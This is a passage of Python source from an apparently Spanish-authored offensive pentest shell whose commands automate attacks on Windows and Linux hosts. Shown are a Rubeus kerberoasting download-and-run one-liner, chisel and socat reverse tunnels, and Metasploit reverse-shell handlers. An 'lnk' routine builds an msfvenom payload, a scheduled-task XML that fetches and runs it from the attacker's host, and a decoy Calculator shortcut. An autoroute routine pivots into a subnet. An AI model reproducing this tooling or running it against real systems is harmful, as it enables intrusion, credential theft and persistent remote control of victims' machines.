        os.system("rm external/.exploit sessions/credentials.txt sessions/*.ps1 sessions/*.scf sessions/chisel* sessions/*.xml sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap* sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* sessions/*.xsl *.xsl -rf")
        print(f"    {GREEN}[*]{YELLOW} cleanned sessions & external directory. {RESET}")
        return

    def do_pyautomate(self, line):
        """pyautomate automatization of tools to pwn a target all rights https://github.com/honze-net/pwntomate """
        directory = 'sessions' 
        # Obtener la lista de archivos en el directorio
        files = os.listdir(directory)
        
        # Filtrar solo los archivos .xml
        xml_files = [file for file in files if file.endswith('.xml')]
        
        # Para cada archivo XML, ejecutar el comando
        for xml_file in xml_files:
            xml_path = os.path.join(directory, xml_file)
            command = f"python3 pwntomate.py {xml_path} -x"
            print(f"    {GREEN}[*] Executing command: {MAGENTA}{command}{RESET}")
            try:
                subprocess.run(command, shell=True, check=True)
            except subprocess.CalledProcessError as e:
                print(f"    {RED}[-] Error executing command for {xml_file}: {e}{RESET}")        
        print(f"    {GREEN}[*]{YELLOW} tha target was pwntomated 🍅. {RESET}")
        return
    def do_alias(self, line):
        """Imprime todos los alias configurados."""
        aliases = LazyOwnShell().aliases
        for alias, command in aliases.items():
            print(f"    [>]{WHITE} Alias {GREEN} {alias}{WHITE} : Full command: {CYAN}{command}{RESET} ")
        return
    def do_rubeus(self,line):
        """copia a la clipboard la borma de descargar Rubeus"""
        lhost = self.params["lhost"]
        if not lhost:
            print(f"    {YELLOW}[-] lhost must be set use set lhost <ip>{RESET}")
            return
        
        print(f"    {GREEN}[*]{YELLOW} Rubeus downloader (echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe' | xclip -sel clip) copied to clipboard. {RESET}")
        os.system(f"echo 'iwr -uri http://{lhost}/Rubeus.exe -OutFile Rubeus.exe ; .\\Rubeus.exe kerberoast /creduser:domain.local\\usuario /credpassword:password' | xclip -sel clip")
        return

    def do_socat(self, line):
        """run socat in ip:port seted by argument config the port 1080 in /etc/proxychains.conf"""
        print(f"    {YELLOW}[+] you must seted {GREEN}socks5 127.0.0.1 1080 {YELLOW}at {GREEN}/etc/proxychains.conf{RESET}")
        if not line:
            print(f"    [?]{YELLOW} you must pass ip:port by argument ex:{GREEN} socat 10.10.10:445  {WHITE} more help: {CYAN} help socat{RESET} ")
            return
        print(f'    {GREEN}[*] Try... {MAGENTA}socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080{RESET}')
        os.system(f'socat TCP-LISTEN:1080,fork SOCKS4A:localhost:{line},socksport=1080')
        print(f"    {RED}[*] {YELLOW} Shutdown socat tunnel at sessions in port {RED} 1080 {RESET}")
        return

    def do_chisel(self, line):
        """run download_resources command to download and run chisel :D like ./chisel_linux_amd64 server -p 3333 --reverse -v """
        lhost = self.params["lhost"]
        if not lhost:
            print(f"    [?]{YELLOW} you must set lhost ex:{GREEN} set lhost 10.10.10.10 or payload (alias p)  {WHITE} more help: {CYAN} help set{RESET} ")
            return
        if not line:
            print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
            return
        if not os.path.exists('sessions/chisel_1.9.1_linux_amd64.gz'):
            print(f"    {YELLOW}[+] you must run download_resources before run {GREEN}chisel {YELLOW}mode server {GREEN}at port {line}{RESET}")
        
        args = line.split(' ')
            

        if len(args) == 2:
            lport = args[0]
            rport = args[1]

            print(f'    {GREEN}[*]Running {YELLOW}./sessions/chisel_1.9.1_linux_amd64 server -p {lport} --reverse -v {RESET} and copied .\chisel.exe client -v {lhost}:{rport} R:{lport} to clipboard :D')
            command = f"iwr -uri http://{lhost}/chisel.exe -OutFile chisel.exe ; .\\chisel.exe client -v {lhost}:{rport} R:{lport}"
            cmdd = f'echo "{command}" | xclip -sel clip'
            print(f"{MAGENTA}[+] Command to copy: {GREEN}{command}{RESET}")
            os.system(cmdd)
            os.system(f"cd sessions && gunzip -c chisel_1.9.1_linux_amd64.gz > chisel_1.9.1_linux_amd64 && gunzip -c chisel_1.9.1_windows_amd64.gz > chisel.exe  && chmod +x * && ./chisel_1.9.1_linux_amd64 server --reverse -p {lport} -v")
            print(f"    {RED}[*] {YELLOW} Shutdown chisel tunnel at sessions in port {RED} {line} {RESET}")

        else:
             print(f"    [?]{YELLOW} you must pass the ports by argument ex:{GREEN} chisel 3333 88 {WHITE} more help: {CYAN} help chisel{RESET} ")
        
        return
        

    def do_msf(self, line):
        """automate msfconsole scan or rev shell"""
        if not line:
            
            rhost = self.params["rhost"]
            if not rhost:
                print(f"    {YELLOW}[-] rhost must be set use set rhost <ip>{RESET}")
                return
            TARGET_IP = rhost
            # Ruta del archivo temporal
            rc_file_path = '/tmp/scan_vulnerabilities.rc'

            # Crear el archivo de comandos para Metasploit
            with open(rc_file_path, 'w') as file:
                file.write(f"""
            # Configurar la IP del objetivo
            setg RHOSTS {TARGET_IP}

            # Escanear puertos abiertos
            use auxiliary/scanner/portscan/tcp
            set THREADS 10
            run

            # Enumerar servicios y versiones
            use auxiliary/scanner/portscan/tcp
            set PORTS 1-65535
            run

            # Buscar vulnerabilidades conocidas
            use auxiliary/scanner/vuln/ms17_010_eternalblue
            set RHOSTS {TARGET_IP}
            run

            # Probar exploits y enumerar vulnerabilidades
            use auxiliary/scanner/ftp/anonymous
            set RHOSTS {TARGET_IP}
            run

            # Buscar módulos de explotación de vulnerabilidades
            search ms17_010

            # Terminar la sesión
            exit
            """)

            # Ejecutar Metasploit con el archivo de comandos
            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)

            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
                # Eliminar el archivo temporal
            print(f"    {RED}[*] {YELLOW} Shutdown msfconsole scan {RED} [;,;] {RESET}")
            return
        elif line.startswith("rev"):
            """Automate msfconsole exploit setup"""
            args = line.split(' ')
            
            if len(args) == 1:
                setpayload = 'windows/meterpreter/reverse_tcp'
            elif len(args) == 2:
                if args[1] == 'win':
                    setpayload = 'windows/meterpreter/reverse_tcp'
                if args[1] == 'win64':
                    setpayload = 'windows/x64/meterpreter/reverse_tcp'
                elif args[1] == 'lin':
                    setpayload = 'linux/x86/meterpreter/reverse_tcp'
                elif args[1] == 'lin64':
                    setpayload = 'linux/x64/meterpreter/reverse_tcp'    
                elif args[1] == 'mac':
                    setpayload = 'osx/x86/shell_reverse_tcp'
                elif args[1] == 'mac64':
                    setpayload = 'osx/x64/meterpreter/reverse_tcp'

            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print(f"    {YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
                return
            # Aquí deberías configurar tu IP y otros parámetros necesarios
            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas

            # Ruta del archivo temporal
            rc_file_path = '/tmp/handler.rc'

            # Crear el archivo de comandos para Metasploit
            with open(rc_file_path, 'w') as file:
                file.write(f"""
                use exploit/multi/handler
                set payload {setpayload}
                set LHOST {lhost}
                set LPORT {lport}
                run
                """)

            # Ejecutar Metasploit con el archivo de comandos
            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)

            # Eliminar el archivo temporal
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
            print(f"    {RED}[*] {YELLOW} Shutdown rev meterpreter sessions {RED} [;,;] {RESET}")
            return

        elif line.startswith("lnk"):
            # Parámetros necesarios
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print(f"    {YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
                return
            # Aquí deberías configurar tu IP y otros parámetros necesarios
            lhost = f"{lhost}"  # Reemplaza con tu dirección IP
            lport = f"{lport}"  # Puedes cambiar el puerto si lo necesitas
            
            web_root = "sessions"
            payload = "C:\\xampp\\htdocs\\payload.exe"  # Ruta al payload
            args = line.split(' ')
            if not lhost or not lport:
                print("    [-] lhost o lport deben estar establecidos. Usa 'set lhost <ip>'")
            else:
                if len(args) == 1:
                    setpayload = 'windows/meterpreter/reverse_tcp'
                elif len(args) == 2:
                    if args[1] == 'win':
                        setpayload = 'windows/meterpreter/reverse_tcp'
                    if args[1] == 'win64':
                        setpayload = 'windows/x64/meterpreter/reverse_tcp'
                              
                # Paso 1: Crear el payload con msfvenom
                payload_path = os.path.join(web_root, "payload.exe")
                msfvenom_cmd = f"msfvenom -p {setpayload} LHOST={lhost} LPORT={lport} -f exe -o {payload_path}"
                subprocess.run(msfvenom_cmd, shell=True, check=True)
                print("    [+] Payload creado con éxito en", payload_path)

                # Paso 2: Crear el archivo XML para la descarga
                xml_content = f"""<?xml version="1.0"?>
                <job>
                <script language="JScript">
                    var objShell = new ActiveXObject("WScript.Shell");
                    var objExec = objShell.Exec("cmd.exe /c powershell -Command \\"Invoke-WebRequest -Uri 'http://{lhost}/payload.exe' -OutFile 'C:\\Windows\\Temp\\payload.exe'; Start-Process 'C:\\Windows\\Temp\\payload.exe'\\"");
                </script>
                </job>
                """
                xml_path = os.path.join(web_root, "download_payload.xml")
                with open(xml_path, 'w') as xml_file:
                    xml_file.write(xml_content)
                print("    [+] Archivo XML creado con éxito en", xml_path)

                # Este paso debe realizarse manualmente: Inserta la macro en tu documento de Office y guárdalo en la ruta especificada.
                print(f"    [+] Asegúrate de que el payload esté en: {payload}")

                # Paso 4: Crear el archivo .lnk con PowerShell
                ps_script_content = f"""
                $WshShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WshShell.CreateShortcut("c:\Common Applications\Calculator.lnk")
                $Shortcut.TargetPath = "{payload}"
                $Shortcut.Save()
                """.replace('                ','')
                ps_script_path = os.path.join("sessions", "create_lnk.ps1")
                with open(ps_script_path, 'w') as ps_script_file:
                    ps_script_file.write(ps_script_content)
                
                print(f"    [+] Script de PowerShell creado en {ps_script_path}")
                print("    [+] Ejecuta este script en la máquina Windows para crear el archivo .lnk")

                # Nota: Este paso debe ejecutarse en la máquina Windows
                cmd = """echo 'powershell -Command \\"Invoke-WebRequest -Uri \'http://{lhost}/download_payload.xml\' -OutFile \'C:\\Windows\\Temp\\download_payload.xml\'; schtasks /create /tn \'DownloadPayload\' /xml \'C:\\Windows\\Temp\\download_payload.xml\' /f; schtasks /run /tn \'DownloadPayload\' ; powershell -ExecutionPolicy Bypass -File create_lnk.ps1' | xclip -sel clip"""
                print(f"    [+] El payload y los archivos necesarios han sido generados exitosamente. el comando {cmd} se copio en la clipboard, ejecute www para diponer los archivos mediante un servidor web")
                os.system(cmd)
                return
        elif line.startswith('autoroute'):
            # Set your parameters here
            args = line.split(' ')
            lhost = self.params["lhost"]
            lport = self.params["lport"]
            if not lhost or not lport:
                print(f"    {YELLOW}[-] lhost or lport must be set use set lhost <ip>{RESET}")
                return 
            if len(args) == 1:
                setpayload = 'windows/meterpreter/reverse_tcp'
            elif len(args) == 2:
                if args[1] == 'win':
                    setpayload = 'windows/meterpreter/reverse_tcp'
                if args[1] == 'win64':
                    setpayload = 'windows/x64/meterpreter/reverse_tcp'
                elif args[1] == 'lin':
                    setpayload = 'linux/x86/meterpreter/reverse_tcp'
                elif args[1] == 'lin64':
                    setpayload = 'linux/x64/meterpreter/reverse_tcp'    
                elif args[1] == 'mac':
                    setpayload = 'osx/x86/shell_reverse_tcp'
                elif args[1] == 'mac64':
                    setpayload = 'osx/x64/meterpreter/reverse_tcp'
            
            session_id = "1"  # The session ID for the active session (adjust as necessary)
            target_subnet = "192.168.100.0"  # The target subnet
            netmask = "255.255.255.0"  # The netmask for the subnet

            # Step 1: Create a Metasploit Resource Script
            rc_file_path = '/tmp/autoroute.rc'

            with open(rc_file_path, 'w') as file:
                file.write(f"""
            use exploit/multi/handler
            set payload {setpayload}
            set LHOST {lhost}
            set LPORT {lport}
            exploit -j -z

            # After getting a session
            sessions -i {session_id}
            run post/multi/manage/autoroute RHOST={target_subnet} NETMASK={netmask}

            # Exit the Metasploit console
            exit
            """)

            # Step 2: Start Metasploit with the Resource Script
            subprocess.run(['msfconsole', '-r', rc_file_path], check=True)

            # Step 3: Set up the Metasploit SOCKS Proxy
            subprocess.run(['msfconsole', '-q', '-x', 'use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run -j'], check=True)

            # Step 4: Configure Proxychains to Use the SOCKS Proxy
            #proxychains_conf_path = '/etc/proxychains.conf'
            #with open(proxychains_conf_path, 'a') as file:
            #    file.write("\nsocks4 127.0.0.1 1080")

            # Notify the user
            print("Proxychains is configured to use the Metasploit SOCKS proxy on 127.0.0.1:1080")
            print("You can now use proxychains with your tools, e.g., proxychains nmap -sT -Pn <target_ip>")

            # Cleanup
            if os.path.exists(rc_file_path):
                os.remove(rc_file_path)
    def do_encrypt(self, line):
        """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("    [?] Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print(f"    [+] File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print(f"    [?] File not found: {file_path}")

    def do_decrypt(self, line):
        """Decrypt a file using XOR. Usage: decrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("    [?] Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print(f"    [+] File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print(f"    [?] File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output


def xor_encrypt_decrypt(data, key):
    """XOR Encrypt or Decrypt data with a given key"""
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])


if __name__ == "__main__":
    p = LazyOwnShell()
    
    if arguments:
        if arg.startswith("-c"):
            cmd = arguments[1]
            p.onecmd(cmd)
            p.cmdloop()

    if NOBANNER is False:
        print(f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}{BOLD}Autor: {CYAN}{BOLD}{BG_RED}grisUN0{RESET}")
        time.sleep(0.2)    
    # Activar el entorno virtual
    
    p.cmdloop()
    
    